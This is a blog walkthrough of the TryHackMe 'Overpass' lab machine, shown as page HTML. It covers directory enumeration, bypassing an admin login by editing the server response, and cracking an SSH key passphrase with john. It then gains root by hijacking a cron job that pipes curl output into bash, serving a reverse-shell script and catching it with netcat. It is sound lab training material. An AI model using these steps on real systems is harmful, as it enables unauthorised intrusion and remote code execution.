<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Overpass-1 -Tryhackme | As-Blog</title><meta name=keywords content="CTF"><meta name=description content="Machine info
https://tryhackme.com/room/overpass
Summary
Overpass is a Tryhackme machine which is related to owasp top 10 vulnerability
Bypassing web authentication
Accessing machine through ssh
Exploiting a weak crontab job
Escalating privileged commands
Enumeration
Regular Nmap port scanning nmap -sCV 10.10.111.163 Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-23 00:47 EST Nmap scan report for 10.10.111.163 Host is up (0.38s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7."><meta name=author content="Me"><link rel=canonical href=https://akhils911dev.github.io/blog/posts/tryhackme-overpass/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/blog/assets/css/stylesheet.min.e21185e6c4b43ff34c81666f70aa4f80140274057866888c0a5c28addc9b7fd2.css integrity="sha256-4hGF5sS0P/NMgWZvcKpPgBQCdAV4ZoiMClwordybf9I=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/blog/assets/js/highlight.min.27cd435cc9ed6abb4b496581b151804f79f366c412620272bb94e2f5f598ebcc.js integrity="sha256-J81DXMntartLSWWBsVGAT3nzZsQSYgJyu5Ti9fWY68w=" onload=hljs.initHighlightingOnLoad();></script><link rel=icon href=https://akhils911dev.github.io/blog/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://akhils911dev.github.io/blog/posts/img/favicon.png><link rel=icon type=image/png sizes=32x32 href=https://akhils911dev.github.io/blog/favicon-32x32.png><link rel=apple-touch-icon href=https://akhils911dev.github.io/blog/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://akhils911dev.github.io/blog/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme: rgb(29, 30, 32);--entry: rgb(46, 46, 51);--primary: rgb(218, 218, 219);--secondary: rgb(155, 156, 157);--tertiary: rgb(65, 66, 68);--content: rgb(196, 196, 197);--hljs-bg: rgb(46, 46, 51);--code-bg: rgb(55, 56, 62);--border: rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script type=application/javascript>var doNotTrack=false;if(!doNotTrack){(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');ga('create','UA-123-45','auto');ga('send','pageview');}</script><meta property="og:title" content="Overpass-1 -Tryhackme"><meta property="og:description" content="Machine info
https://tryhackme.com/room/overpass
Summary
Overpass is a Tryhackme machine which is related to owasp top 10 vulnerability
Bypassing web authentication
Accessing machine through ssh
Exploiting a weak crontab job
Escalating privileged commands
Enumeration
Regular Nmap port scanning nmap -sCV 10.10.111.163 Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-23 00:47 EST Nmap scan report for 10.10.111.163 Host is up (0.38s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7."><meta property="og:type" content="article"><meta property="og:url" content="https://akhils911dev.github.io/blog/posts/tryhackme-overpass/"><meta property="og:image" content="https://akhils911dev.github.io/blog/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-01-17T00:00:00+00:00"><meta property="article:modified_time" content="2022-01-17T00:00:00+00:00"><meta property="og:site_name" content="ExampleSite"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://akhils911dev.github.io/blog/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="Overpass-1 -Tryhackme"><meta name=twitter:description content="Machine info
https://tryhackme.com/room/overpass
Summary
Overpass is a Tryhackme machine which is related to owasp top 10 vulnerability
Bypassing web authentication
Accessing machine through ssh
Exploiting a weak crontab job
Escalating privileged commands
Enumeration
Regular Nmap port scanning nmap -sCV 10.10.111.163 Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-23 00:47 EST Nmap scan report for 10.10.111.163 Host is up (0.38s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Overpass-1 -Tryhackme","item":"https://akhils911dev.github.io/blog/posts/tryhackme-overpass/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Overpass-1 -Tryhackme","name":"Overpass-1 -Tryhackme","description":"Machine info\nhttps://tryhackme.com/room/overpass\nSummary\nOverpass is a Tryhackme machine which is related to owasp top 10 vulnerability\nBypassing web authentication\nAccessing machine through ssh\nExploiting a weak crontab job\nEscalating privileged commands\nEnumeration\nRegular Nmap port scanning nmap -sCV 10.10.111.163 Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-23 00:47 EST Nmap scan report for 10.10.111.163 Host is up (0.38s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.","keywords":["CTF"],"articleBody":"Machine info\nhttps://tryhackme.com/room/overpass\nSummary\nOverpass is a Tryhackme machine which is related to owasp top 10 vulnerability\nBypassing web authentication\nAccessing machine through ssh\nExploiting a weak crontab job\nEscalating privileged commands\nEnumeration\nRegular Nmap port scanning nmap -sCV 10.10.111.163 Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-23 00:47 EST Nmap scan report for 10.10.111.163 Host is up (0.38s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA) | 256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA) |_ 256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519) 80/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) |_http-title: Overpass Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 75.40 seconds Accessing port 80\nfind hidden directory using gobuster we can see a hidden directory /admin\ngobuster dir -u http://10.10.111.163/ -w /usr/share/wordlists/dirb/common.txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.111.163/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/01/23 00:59:42 Starting gobuster in directory enumeration mode =============================================================== /aboutus (Status: 301) [Size: 0] [-- aboutus/] /admin (Status: 301) [Size: 42] [-- /admin/] /css (Status: 301) [Size: 0] [-- css/] /downloads (Status: 301) [Size: 0] [-- downloads/] /img (Status: 301) [Size: 0] [-- img/] /index.html (Status: 301) [Size: 0] [-- ./] =============================================================== 2022/01/23 01:02:47 Finished =============================================================== going to http://10.10.111.163/admin\nwe try SQL injection but it doesn’t work so we need to search for another way after that, we found this from javascript the script telling as the statusOrCookie parameter needs Incorrect Credentials We can modify the response that we get to login access\nlets config the burp suite to intercept the request and forward the request we can see that response got incorrect credentials\nwe can now modify the response and forward it\nlet’s go back to the browser and refresh the page boom we’ve bypassed the authentication!\nGaining access\nit has a private key for user James\nIt requires a key phrase to get access\nfirst, we need to convert the key into a format JTR using ssh2john.py\n/usr/share/john/ssh2john.py ssh.key  hash now we are ready to crack the phrase using john\nsudo john hash --wordlist=/usr/share/wordlists/rockyou.txt 1 ⨯ Using default input encoding: UTF-8 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes Cost 2 (iteration count) is 1 for all loaded hashes Will run 4 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status james13 (ssh.key) 1g 0:00:00:00 DONE (2022-01-23 01:34) 50.00g/s 668800p/s 668800c/s 668800C/s pink25..honolulu Use the \"--show\" option to display all of the cracked passwords reliably Session completed. let’s access the machine through ssh\nssh -i ssh.key james@10.10.111.163 Enter passphrase for key 'ssh.key': Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Sun Jan 23 06:40:06 UTC 2022 System load: 0.0 Processes: 88 Usage of /: 22.3% of 18.57GB Users logged in: 0 Memory usage: 15% IP address for eth0: 10.10.111.163 Swap usage: 0% * Canonical Livepatch is available for installation. - Reduce system reboots and improve kernel security. Activate at: https://ubuntu.com/livepatch 47 packages can be updated. 0 updates are security updates. Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1 james@overpass-prod:~$ ls todo.txt user.txt james@overpass-prod:~$ cat user.txt thm{65c1aaf000506e56996822c6281e6bf7} now we got the user.txt flag and now the time for the root flag\nprivilege escalation\nenumerating basic privilege escalation method we found a cronjob\njames@overpass-prod:~$ cat /etc/crontab # /etc/crontab: system-wide crontab # Unlike any other crontab you don't have to run the `crontab' # command to install the new version when you edit this file # and files in /etc/cron.d. These files also have username fields, # that none of the other crontabs do. SHELL=/bin/sh PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin # m h dom mon dow user\tcommand 17 *\t* * *\troot cd / \u0026\u0026 run-parts --report /etc/cron.hourly 25 6\t* * *\troot\ttest -x /usr/sbin/anacron || ( cd / \u0026\u0026 run-parts --report /etc/cron.daily ) 47 6\t* * 7\troot\ttest -x /usr/sbin/anacron || ( cd / \u0026\u0026 run-parts --report /etc/cron.weekly ) 52 6\t1 * *\troot\ttest -x /usr/sbin/anacron || ( cd / \u0026\u0026 run-parts --report /etc/cron.monthly ) # Update builds from latest code * * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash the cronjob running a curl tool for remotely fetching a bash script and executed it so we can exploit this for root access\nlet’s change the hostname to our IP to fetch our bash script which is a reverse shell\nchanging the 127.0.0.1 to our IP 10.6.124.128\nWe will create a downloads folder followed by src and also creates our bash script for reverse shell\nmkdir -p www/downloads/src/ running a python server on port 80 and waiting for executing the cronjob to fetch our reverse shell script\npython3 -m http.server -b 10.6.124.128 80 2 ⨯ Serving HTTP on 10.6.124.128 port 80 (http://10.6.124.128:80/) ... 10.10.111.163 - - [23/Jan/2022 00:34:02] \"GET /downloads/src/buildscript.sh HTTP/1.1\" 200 - 10.10.111.163 - - [23/Jan/2022 00:35:02] \"GET /downloads/src/buildscript.sh HTTP/1.1\" 200 - set up Netcat listener on port 7777\nnc -lnvp 7777 listening on [any] 7777 ... connect to [10.6.124.128] from (UNKNOWN) [10.10.139.183] 39074 bash: cannot set terminal process group (1216): Inappropriate ioctl for device bash: no job control in this shell root@overpass-prod:~# ls ls buildStatus builds go root.txt src root@overpass-prod:~# cat root.txt cat root.txt thm{7f336f8c359dbac18d54fdd64ea753bb} we got the connection back as root and got the root flag.txt\n","wordCount":"944","inLanguage":"en","datePublished":"2022-01-17T00:00:00Z","dateModified":"2022-01-17T00:00:00Z","author":{"@type":"Person","name":"Me"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://akhils911dev.github.io/blog/posts/tryhackme-overpass/"},"publisher":{"@type":"Organization","name":"As-Blog","logo":{"@type":"ImageObject","url":"https://akhils911dev.github.io/blog/favicon.ico"}}}</script></head><body id=top><script>if(localStorage.getItem("pref-theme")==="dark"){document.body.classList.add('dark');}else if(localStorage.getItem("pref-theme")==="light"){document.body.classList.remove('dark')}else if(window.matchMedia('(prefers-color-scheme: dark)').matches){document.body.classList.add('dark');}</script><header class=header><nav class=nav><div class=logo><a href=https://akhils911dev.github.io/blog/ accesskey=h title="Akhil S (Alt + H)">Akhil S</a>
<span class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></span></div><ul id=menu><li><a href=https://akhils911dev.github.io/blog/archives/ title=Archives><span>Archives</span></a></li><li><a href=https://akhils911dev.github.io/blog/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://akhils911dev.github.io/blog/search/ title=Search><span>Search</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://akhils911dev.github.io/blog/>Home</a></div><h1 class=post-title>Overpass-1 -Tryhackme</h1><div class=post-meta><span title="2022-01-17 00:00:00 +0000 UTC">January 17, 2022</span>&nbsp;·&nbsp;5 min&nbsp;·&nbsp;Me&nbsp;|&nbsp;<a href=https://github.com/%3cpath_to_repo%3e/content/posts/TryhackMe-Overpass.md rel="noopener noreferrer" target=_blank>Suggest Changes</a></div></header><div class=post-content><p><strong>Machine info</strong></p><p><a href=https://tryhackme.com/room/overpass>https://tryhackme.com/room/overpass</a></p><p><strong>Summary</strong></p><p>Overpass is a Tryhackme machine which is related to owasp top 10 vulnerability</p><p>Bypassing web authentication</p><p>Accessing machine through ssh</p><p>Exploiting a weak crontab job</p><p>Escalating privileged commands</p><p><strong>Enumeration</strong></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>Regular Nmap port scanning

nmap -sCV 10.10.111.163        
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-23 00:47 EST
Nmap scan report for 10.10.111.163
Host is up (0.38s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
|_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 75.40 seconds
</code></pre></div><p>Accessing port 80</p><p><img loading=lazy src=/blog/posts/img/overpass1.png alt="Test Image"></p><p>find hidden directory using gobuster we can see a hidden directory /admin</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>gobuster dir -u http://10.10.111.163/ -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) <span style=color:#960050;background-color:#1e0010>&amp;</span> Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.111.163/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/01/23 00:59:42 Starting gobuster in directory enumeration mode
===============================================================
/aboutus              (Status: 301) [Size: 0] [--&gt; aboutus/]
/admin                (Status: 301) [Size: 42] [--&gt; /admin/]
/css                  (Status: 301) [Size: 0] [--&gt; css/]    
/downloads            (Status: 301) [Size: 0] [--&gt; downloads/]
/img                  (Status: 301) [Size: 0] [--&gt; img/]      
/index.html           (Status: 301) [Size: 0] [--&gt; ./]        
                                                              
===============================================================
2022/01/23 01:02:47 Finished
===============================================================
</code></pre></div><p>going to <em><strong>http://10.10.111.163/admin</strong></em></p><p><img loading=lazy src=/blog/posts/img/overpass2.png alt="Test Image"></p><p>we try SQL injection but it doesn&rsquo;t work so we need to search for another way
after that, we found this from javascript the script telling as the statusOrCookie parameter needs Incorrect Credentials
We can modify the response that we get to login access</p><p><img loading=lazy src=/blog/posts/img/overpass3.png alt="Test Image"></p><p>lets config the burp suite to intercept the request and forward the request
we can see that response got incorrect credentials</p><p><img loading=lazy src=/blog/posts/img/overpass4.png alt="Test Image"></p><p>we can now modify the response and forward it</p><p><img loading=lazy src=/blog/posts/img/overpass5.png alt="Test Image"></p><p>let&rsquo;s go back to the browser and refresh the page
boom we’ve bypassed the authentication!</p><p><img loading=lazy src=/blog/posts/img/overpass6.png alt="Test Image"></p><p><strong>Gaining access</strong></p><p>it has a private key for user James</p><p>It requires a key phrase to get access</p><p>first, we need to convert the key into a format JTR
using ssh2john.py</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>/usr/share/john/ssh2john.py ssh.key &gt; hash
</code></pre></div><p>now we are ready to crack the phrase using john</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>sudo john hash  --wordlist=/usr/share/wordlists/rockyou.txt                                                   1 ⨯
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
james13          (ssh.key)     
1g 0:00:00:00 DONE (2022-01-23 01:34) 50.00g/s 668800p/s 668800c/s 668800C/s pink25..honolulu
Use the &#34;--show&#34; option to display all of the cracked passwords reliably
Session completed.
</code></pre></div><p>let&rsquo;s access the machine through ssh</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>ssh -i ssh.key james@10.10.111.163
Enter passphrase for key &#39;ssh.key&#39;: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Jan 23 06:40:06 UTC 2022

  System load:  0.0                Processes:           88
  Usage of /:   22.3% of 18.57GB   Users logged in:     0
  Memory usage: 15%                IP address for eth0: 10.10.111.163
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

47 packages can be updated.
0 updates are security updates.


Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1
james@overpass-prod:~$ ls
todo.txt  user.txt
james@overpass-prod:~$ cat user.txt
thm{65c1aaf000506e56996822c6281e6bf7}
</code></pre></div><p>now we got the <em><strong>user.txt</strong></em> flag and now the time for the root flag</p><p><strong>privilege escalation</strong></p><p>enumerating basic privilege escalation method we found a cronjob</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>james@overpass-prod:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don&#39;t have to run the `crontab&#39;
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / <span style=color:#960050;background-color:#1e0010>&amp;&amp;</span> run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / <span style=color:#960050;background-color:#1e0010>&amp;&amp;</span> run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / <span style=color:#960050;background-color:#1e0010>&amp;&amp;</span> run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / <span style=color:#960050;background-color:#1e0010>&amp;&amp;</span> run-parts --report /etc/cron.monthly )
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
</code></pre></div><p>the cronjob running a curl tool for remotely fetching a bash script and executed it
so we can exploit this for root access</p><p>let&rsquo;s change the hostname to our IP to fetch our bash script which is a reverse shell</p><p><img loading=lazy src=/blog/posts/img/overpass7.png alt="Test Image"></p><p>changing the 127.0.0.1 to our IP 10.6.124.128</p><p>We will create a downloads folder followed by src and also creates our bash script for reverse shell</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>mkdir -p www/downloads/src/
</code></pre></div><p><img loading=lazy src=/blog/posts/img/overpass8.png alt="Test Image"></p><p>running a python server on port 80 and waiting for executing the cronjob to fetch our reverse shell script</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>python3 -m http.server -b 10.6.124.128 80                            2 ⨯
Serving HTTP on 10.6.124.128 port 80 (http://10.6.124.128:80/) ...
10.10.111.163 - - [23/Jan/2022 00:34:02] &#34;GET /downloads/src/buildscript.sh HTTP/1.1&#34; 200 -
10.10.111.163 - - [23/Jan/2022 00:35:02] &#34;GET /downloads/src/buildscript.sh HTTP/1.1&#34; 200 -
</code></pre></div><p>set up Netcat listener on port 7777</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>nc -lnvp 7777      
listening on [any] 7777 ...
connect to [10.6.124.128] from (UNKNOWN) [10.10.139.183] 39074
bash: cannot set terminal process group (1216): Inappropriate ioctl for device
bash: no job control in this shell
root@overpass-prod:~# ls
ls
buildStatus
builds
go
root.txt
src
root@overpass-prod:~# cat root.txt
cat root.txt
thm{7f336f8c359dbac18d54fdd64ea753bb}
</code></pre></div><p>we got the connection back as root and got the root <em><strong>flag.txt</strong></em></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://akhils911dev.github.io/blog/tags/ctf/>CTF</a></li></ul><nav class=paginav><a class=prev href=https://akhils911dev.github.io/blog/posts/tryhackme-bounty-hacker/><span class=title>« Prev Page</span><br><span>Bounty-Hacker -Tryhackme</span></a>
<a class=next href=https://akhils911dev.github.io/blog/posts/vulnhub-dc/><span class=title>Next Page »</span><br><span>Vulnhub-Dc-1</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share Overpass-1 -Tryhackme on twitter" href="https://twitter.com/intent/tweet/?text=Overpass-1%20-Tryhackme&url=https%3a%2f%2fakhils911dev.github.io%2fblog%2fposts%2ftryhackme-overpass%2f&hashtags=CTF"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512h-386.892c-34.524.0-62.554-28.03-62.554-62.554v-386.892c0-34.524 28.029-62.554 62.554-62.554h386.892zm-253.927 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z" /></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Overpass-1 -Tryhackme on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fakhils911dev.github.io%2fblog%2fposts%2ftryhackme-overpass%2f&title=Overpass-1%20-Tryhackme&summary=Overpass-1%20-Tryhackme&source=https%3a%2f%2fakhils911dev.github.io%2fblog%2fposts%2ftryhackme-overpass%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512h-386.892c-34.524.0-62.554-28.03-62.554-62.554v-386.892c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0v-129.439c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02v-126.056c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768h75.024zm-307.552-334.556c-25.674.0-42.448 16.879-42.448 39.002.0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z" /></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Overpass-1 -Tryhackme on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fakhils911dev.github.io%2fblog%2fposts%2ftryhackme-overpass%2f&title=Overpass-1%20-Tryhackme"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512h-386.892c-34.524.0-62.554-28.03-62.554-62.554v-386.892c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zm-119.474 108.193c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zm-160.386-29.702c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z" /></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Overpass-1 -Tryhackme on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fakhils911dev.github.io%2fblog%2fposts%2ftryhackme-overpass%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978v-192.915h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554v-386.892c0-34.524 28.029-62.554 62.554-62.554h386.892z" 